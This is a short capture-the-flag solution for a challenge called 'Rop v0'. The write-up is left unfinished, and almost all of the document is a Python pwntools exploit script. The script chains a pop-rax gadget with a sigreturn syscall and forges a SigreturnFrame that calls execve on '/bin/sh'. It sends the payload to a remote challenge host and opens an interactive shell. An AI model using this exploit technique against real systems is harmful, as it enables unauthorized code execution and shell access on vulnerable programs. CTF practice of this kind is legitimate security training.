# Rop v0
## TLDR
Signal Rop to execve

## Complete write up
To do soon

## Solution
```python
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"

e = ELF('challs')
if(len(argv) == 2):
    p = connect("193.57.159.27", 20322)
else:
    # p = process('challs')
    p = gdb.debug('./challs', '''b *0x000000000040102D
        ''')


syscall = 0x000000000040102B


frame = SigreturnFrame()
frame.rax = 0x3b                # execve
frame.rdi = 0x0000000000402000  # /bin/sh 
frame.rsi = 0                   # null
frame.rdx = 0                   # null
frame.rsp = 0x0000000000400018  # rsp
frame.rip = syscall


print frame

pload = ''
pload += "CCCDDDDD"
pload += p64(0x000000000040103f) # pop rax
pload += p64(0xf)
pload += p64(syscall)
pload += str(frame)
pload += "\x00"*(4096 - len(pload))

open('tmp', 'w').write(pload)
p.send(pload)

p.interactive()
```